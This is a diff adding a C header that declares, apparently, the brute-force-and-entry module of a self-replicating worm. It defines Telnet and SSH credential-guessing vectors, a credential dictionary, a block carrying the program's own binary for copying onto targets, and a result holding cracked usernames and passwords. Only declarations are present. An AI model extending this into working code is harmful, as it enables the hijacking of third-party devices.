@@ -1,0 +1,69 @@
+#pragma once
+#include <stdio.h>
+#include <stddef.h>
+#include <inttypes.h>
+#include <stdbool.h>
+
+#include <mbedtls/ctr_drbg.h>
+
+#include "pth.h"
+#include "protocol.h"
+#include "pack.h"
+#include "cred_dict.h"
+
+
+struct prne_bne;
+typedef struct prne_bne_param prne_bne_param_t;
+typedef struct prne_bne prne_bne_t;
+typedef struct prne_bne_result prne_bne_result_t;
+
+enum prne_bne_vector {
+	PRNE_BNE_V_NONE = -1,
+	PRNE_BNE_V_BRUTE_TELNET,
+	PRNE_BNE_V_BRUTE_SSH,
+	NB_PRNE_BNE_V
+};
+typedef enum prne_bne_vector prne_bne_vector_t;
+
+struct prne_bne_param {
+	const prne_cred_dict_t *cred_dict;
+	struct {
+		const prne_bne_vector_t *arr;
+		size_t cnt;
+	} vector;
+	struct {
+		bool (*enter_dd)(void);
+		void (*exit_dd)(void);
+	} cb;
+	struct {
+		const uint8_t *m_self;
+		size_t self_len;
+		size_t exec_len;
+		const uint8_t *m_dv;
+		size_t dv_len;
+		const prne_bin_archive_t *ba;
+		prne_arch_t self;
+	} rcb;
+	prne_ip_addr_t subject;
+};
+
+struct prne_bne_result {
+	struct {
+		char *id;
+		char *pw;
+	} cred;
+	const prne_ip_addr_t *subject;
+	int err;
+	prne_bne_vector_t vec;
+	prne_pack_rc_t prc;
+};
+
+void prne_init_bne_param (prne_bne_param_t *p);
+void prne_free_bne_param (prne_bne_param_t *p);
+
+const char *prne_bne_vector_tostr (const prne_bne_vector_t v);
+
+prne_bne_t *prne_alloc_bne (
+	prne_worker_t *w,
+	mbedtls_ctr_drbg_context *ctr_drbg,
+	const prne_bne_param_t *param);
